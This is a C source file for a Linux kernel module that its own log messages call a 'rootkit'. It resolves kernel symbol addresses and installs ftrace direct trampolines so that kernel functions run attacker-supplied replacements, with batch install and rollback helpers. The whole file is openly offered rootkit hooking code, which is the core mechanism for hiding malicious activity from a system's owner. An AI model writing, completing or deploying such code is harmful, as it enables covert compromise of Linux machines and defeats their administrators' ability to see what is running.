#include "hooking.h"
#include "ksym.h"
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/ftrace.h>

static int resolve_hook_addr(struct ftrace_hook *hook) {
    hook->address = ksym_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rootkit: symbol %s not found\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;
    return 0;
}

int install_hook(struct ftrace_hook *hook) {
    int err;

    err = resolve_hook_addr(hook);
    if (err)
        return err;

    // direct trampolines
    hook->ops.flags = FTRACE_OPS_FL_DIRECT | FTRACE_OPS_FL_SAVE_REGS;
    hook->ops.func = NULL; 
    hook->ops.direct_func = NULL;

    err = register_ftrace_direct(&hook->ops, hook->address, (unsigned long)hook->function);
    if (err) {
        pr_err("rootkit: register_ftrace_direct failed for %s: %d\n", hook->name, err);
        return err;
    }

    return 0;
}

void remove_hook(struct ftrace_hook *hook) {
    unregister_ftrace_direct(&hook->ops, hook->address, (unsigned long)hook->function);
}

int install_hooks(struct ftrace_hook *hooks, size_t count) {
    int err;
    size_t i;

    for (i = 0; i < count; i++) {
        err = install_hook(&hooks[i]);
        if (err) {
            while (i > 0) {
                remove_hook(&hooks[--i]);
            }
            return err;
        }
    }

    return 0;
}

void remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++) {
        remove_hook(&hooks[i]);
    }
}
